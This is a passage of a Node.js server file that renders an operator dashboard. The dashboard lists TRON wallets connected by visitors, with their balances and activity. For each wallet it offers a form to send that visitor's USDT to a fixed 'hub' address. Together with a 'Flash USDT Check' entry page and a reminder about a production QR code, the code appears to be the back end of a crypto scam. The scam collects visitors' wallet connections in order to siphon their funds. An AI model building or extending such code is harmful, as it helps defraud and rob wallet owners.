    const address = escapeHtml(wallet.address);
    const isTron = /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(wallet.address);
    return `<article class="master-wallet-card" data-wallet-address="${address}" data-wallet-network="${isTron ? "tron" : "evm"}">
      <header>
        <p class="master-wallet-kicker">Connected wallet</p>
        <p class="address master-wallet-address">${address}</p>
        <p class="master-wallet-meta">Linked to hub <span class="address">${target}</span> · ${escapeHtml(formatConnectedAt(wallet.connectedAt))}</p>
        <p class="master-wallet-meta">${snapshotNote}</p>
      </header>
      <div class="master-wallet-preview">
        <h2 class="master-wallet-assets-title">Wallet provider assets</h2>
        <div class="master-provider-assets">${assetHtml}</div>
        <h2 class="master-wallet-assets-title">Recent activity</h2>
        <div class="master-provider-transactions">${txHtml}</div>
      </div>
      <button class="primary-action master-manage-open" type="button">Manage assets</button>
      <div class="master-manage-panel" hidden>
        <h2 class="master-wallet-assets-title">Live provider refresh</h2>
        <p class="master-transfer-note">Connect TronLink with this wallet to refresh balances and activity directly from the wallet provider. Transfers still require that wallet signature.</p>
        <button class="primary-action master-refresh-provider" type="button">Refresh from TronLink</button>
        <div class="master-provider-assets master-provider-assets-live"></div>
        <div class="master-provider-transactions master-provider-transactions-live"></div>
        <form class="master-transfer-form">
          <label>Transfer recipient (hub)</label>
          <input class="master-transfer-recipient" type="text" value="${hub}" readonly spellcheck="false">
          <label>USDT amount</label>
          <input class="master-transfer-amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00" required>
          <button class="primary-action master-review-transfer" type="submit">Review transfer to hub</button>
        </form>
        <div class="master-transfer-review" hidden>
          <h3 class="master-review-title">Confirm before your wallet signs</h3>
          <dl class="master-review-list">
            <div><dt>From</dt><dd class="address master-review-from"></dd></div>
            <div><dt>To (hub)</dt><dd class="address master-review-to"></dd></div>
            <div><dt>Token</dt><dd>TRC-20 USDT</dd></div>
            <div><dt>Amount</dt><dd class="master-review-amount"></dd></div>
          </dl>
          <p class="master-transfer-note">Reject the wallet prompt if any detail differs. No seed phrase · No private key · No auto-approve.</p>
          <button class="primary-action master-connect-wallet" type="button">Connect TronLink to sign</button>
          <button class="primary-action master-sign-transfer" type="button" hidden>Approve transfer in wallet</button>
          <button class="retry-button master-cancel-transfer" type="button">Cancel review</button>
          <p class="master-connect-status" role="status"></p>
        </div>
        <p class="master-transfer-status" role="status" aria-live="polite"></p>
        <p class="master-transfer-error asset-error" role="alert" hidden></p>
      </div>
    </article>`;
  }).join("");
  const body = cards || `<p>No wallets have connected yet.</p>`;
  return pageShell("Hub master wallet", `<section class="card master-wallet-shell" id="master-wallet-root" data-hub-target="${hub}" aria-labelledby="master-wallet-title">
      <p class="eyebrow">Hub master wallet</p>
      <h1 id="master-wallet-title">Connected wallet review</h1>
      <p class="lede">Hub <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Each card shows the visitor’s last Web3 provider snapshot from the dapp plus live TronLink refresh inside Manage.</p>
      <p class="master-safety">No seed phrase · No private key · No auto-approve · Transfers require the visitor wallet signature</p>
      <div class="master-wallet-grid" id="master-wallet-grid">${body}</div>
      <div class="master-wallet-actions">
        <a class="ghost" href="/">Flash USDT Check</a>
        <form method="post" action="/logout"><button class="ghost" type="submit">Log out</button></form>
      </div>
    </section>`, { masterStyles: true, masterScript: true });
}

/**
 * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string, assets?: { ok: boolean, trxDisplay?: string, usdtDisplay?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }>, error?: string } }>} wallets
 */
function walletListPage(wallets) {
  const hub = escapeHtml(CONNECTION_TARGET);
  const rows = [...wallets].reverse().map((wallet) => {
    const target = escapeHtml(wallet.connectionTarget || CONNECTION_TARGET);
    const assets = wallet.assets && wallet.assets.ok
      ? formatOperatorAssetSummary(wallet.assets)
      : `<span class="muted">${escapeHtml(wallet.assets?.error || "Balance unavailable")}</span>`;
    return `<tr>
        <td class="address">${escapeHtml(wallet.address)}</td>
        <td class="address">${target}</td>
        <td>${assets}</td>
        <td>${escapeHtml(formatConnectedAt(wallet.connectedAt))}</td>
      </tr>`;
  }).join("");
  const body = rows
    ? `<table><thead><tr><th>Verified wallet</th><th>Linked to</th><th>Public TRON assets</th><th>Connected</th></tr></thead><tbody>${rows}</tbody></table>`
    : `<p>No wallets have connected yet.</p>`;
  return pageShell("Connected wallets", `<section class="card operator-list" aria-labelledby="wallets-title">
      <p class="eyebrow">Operator</p>
      <h1 id="wallets-title">Linked wallet view</h1>
      <p class="lede">Main hub <span class="address">${hub}</span>. Verified visitor wallets below show read-only TRX, TRC-10, and TRC-20 balances from public TRON data.</p>
      ${body}
      <form method="post" action="/logout"><button class="ghost" type="submit">Log out</button></form>
    </section>`);
}

/**
 * @param {string} title
 * @param {string} main
 * @param {{ masterStyles?: boolean, masterScript?: boolean }} [options]
 */
function pageShell(title, main, options = {}) {
  const extraStyles = options.masterStyles ? `
    .master-wallet-shell { width: min(100%, 980px); }
    .master-wallet-grid { display: grid; gap: 18px; margin-top: 18px; }
    .master-wallet-card { padding: 18px; border: 1px solid var(--line); border-radius: 16px; background: rgba(8, 14, 12, 0.72); }
    .master-wallet-kicker { margin: 0 0 6px; color: var(--accent); font-size: 0.68rem; font-weight: 800; letter-spacing: 0.12em; text-transform: uppercase; }
    .master-wallet-address { margin: 0 0 8px; word-break: break-all; }
    .master-wallet-meta { margin: 0 0 14px; color: var(--muted); font-size: 0.78rem; }
    .master-wallet-preview { margin-top: 8px; }
    .master-tx-list { margin: 0; padding-left: 18px; color: var(--text); }
    .master-tx-list li { margin: 8px 0; }
    .master-tx-id { word-break: break-all; font-size: 0.72rem; }
    .master-refresh-provider { margin: 8px 0 12px; }
    .master-manage-panel { margin-top: 16px; padding-top: 16px; border-top: 1px solid var(--line); }
    .master-wallet-assets-title { margin: 0 0 8px; font-size: 0.95rem; }
    .master-asset-list { margin: 0; padding-left: 18px; color: var(--text); }
    .master-asset-list li { margin: 4px 0; }
    .master-transfer-form label { display: block; margin: 12px 0 6px; color: var(--muted); font-size: 0.82rem; }
    .master-transfer-form input { width: 100%; padding: 10px 12px; border: 1px solid var(--line); border-radius: 10px; background: rgba(8, 14, 12, 0.92); color: var(--text); font: inherit; }
    .master-review-transfer, .master-connect-wallet, .master-sign-transfer { margin-top: 12px; margin-right: 8px; }
    .master-review-title { margin: 16px 0 8px; font-size: 0.95rem; }
    .master-review-list { display: grid; gap: 8px; margin: 0 0 10px; }
    .master-review-list dt { color: var(--muted); font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.08em; }
    .master-review-list dd { margin: 0; }
    .master-transfer-note { margin: 10px 0 0; color: var(--muted); font-size: 0.78rem; }
    .master-connect-status, .master-transfer-status { margin: 10px 0 0; color: var(--muted); font-size: 0.78rem; }
    .master-safety { margin: 10px 0 0; color: var(--accent); font-size: 0.78rem; }
    .master-wallet-actions { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 22px; align-items: center; }
    .master-back-link { margin-top: 16px; font-size: 0.82rem; }
  ` : "";
  const scriptTag = options.masterScript ? `\n  ${masterWalletScriptTag()}` : "";
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="referrer" content="no-referrer">
  <title>${escapeHtml(title)}</title>
  <link rel="stylesheet" href="/src/styles.css">
  <style>
    .operator-list { width: min(100%, 720px); }
    table { width: 100%; border-collapse: collapse; margin-top: 12px; }
    th, td { text-align: left; padding: 10px 8px; border-bottom: 1px solid var(--line); vertical-align: top; }
    th { color: var(--muted); font-size: 0.82rem; }
    .muted { color: var(--muted); font-size: 0.88rem; }
    ${extraStyles}
  </style>
</head>
<body>
  <main class="screen">
    ${main}
  </main>${scriptTag}
</body>
</html>`;
}

/**
 * @returns {string}
 */
function masterWalletScriptTag() {
  const source = readFileSync(path.join(root, "src", "master-wallet.js"));
  const query = createHash("sha256").update(source).digest("hex").slice(0, 12);
  return `<script type="module" src="/src/master-wallet.js?v=${query}"></script>`;
}

/**
 * @param {string} value
 */
function escapeHtml(value) {
  return value.replace(/[&<>"']/g, (character) => {
    if (character === "&") return "&amp;";
    if (character === "<") return "&lt;";
    if (character === ">") return "&gt;";
    if (character === '"') return "&quot;";
    return "&#39;";
  });
}

/**
 * @param {string} iso
 */
function formatConnectedAt(iso) {
  const date = new Date(iso);
  if (Number.isNaN(date.getTime())) return iso;
  return date.toISOString().replace("T", " ").replace(/\.\d{3}Z$/, " UTC");
}

/**
 * @param {import("node:http").ServerResponse} response
 * @param {number} status
 * @param {string} html
 */
function sendHtml(response, status, html) {
  finish(response, status, {
    "Content-Type": "text/html; charset=utf-8",
    "Cache-Control": "no-store",
    "X-Content-Type-Options": "nosniff",
  }, html);
}

/**
 * @param {import("node:http").ServerResponse} response
 * @param {number} status
 * @param {string} text
 */
function sendText(response, status, text) {
  finish(response, status, {
    "Content-Type": "text/plain; charset=utf-8",
    "Cache-Control": "no-store",
    "X-Content-Type-Options": "nosniff",
  }, text);
}

/**
 * @param {import("node:http").ServerResponse} response
 * @param {number} status
 * @param {unknown} payload
 */
function sendJson(response, status, payload) {
  finish(response, status, {
    "Content-Type": "application/json; charset=utf-8",
    "Cache-Control": "no-store",
    "X-Content-Type-Options": "nosniff",
  }, JSON.stringify(payload));
}

/**
 * Send a fully framed response. Explicit lengths and connection closure avoid
 * chunked responses that some embedded browser panels drop.
 * @param {import("node:http").ServerResponse} response
 * @param {number} status
 * @param {import("node:http").OutgoingHttpHeaders} headers
 * @param {string | Buffer} [body]
 */
function finish(response, status, headers, body = "") {
  const payload = Buffer.isBuffer(body) ? body : Buffer.from(body);
  response.writeHead(status, {
    ...headers,
    "Content-Length": String(payload.byteLength),
    Connection: "close",
  });
  response.end(payload);
}

server.listen(port, "127.0.0.1", () => {
  const address = server.address();
  const actualPort = address && typeof address === "object" ? address.port : port;
  console.log(`Local preview: http://127.0.0.1:${actualPort}`);
  console.log("Do not generate the production QR from this local URL.");
});
